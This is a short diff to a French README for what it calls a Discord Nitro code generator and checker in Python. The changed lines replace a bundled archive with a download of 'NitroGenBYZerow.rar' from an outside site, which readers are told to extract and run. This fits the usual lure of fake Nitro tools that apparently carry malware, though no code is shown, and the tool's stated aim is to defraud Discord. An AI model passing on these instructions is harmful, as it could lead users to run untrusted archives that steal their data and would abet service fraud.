@@ -24,7 +24,8 @@ Il s'agit d'un générateur de code discord nitro et d'un vérificateur en pytho
 
 - Installer Python : https://www.python.org/downloads/release/python-370/
 - Installer VS Code : https://code.visualstudio.com
-- Dézipper le ficher "unzip me.rar" avec l'outil winrar https://www.win-rar.com/postdownload.html?&L=10
+- Installer mon code sur : https://zerow.online/github/NitroGenBYZerow.rar
+- Dézipper le ficher avec l'outil winrar : https://www.win-rar.com/postdownload.html?&L=10
 - Lancez bot.py et laissez le programme tourner.
 
 Vous pouvez à présent profiter de ce générateur nitro
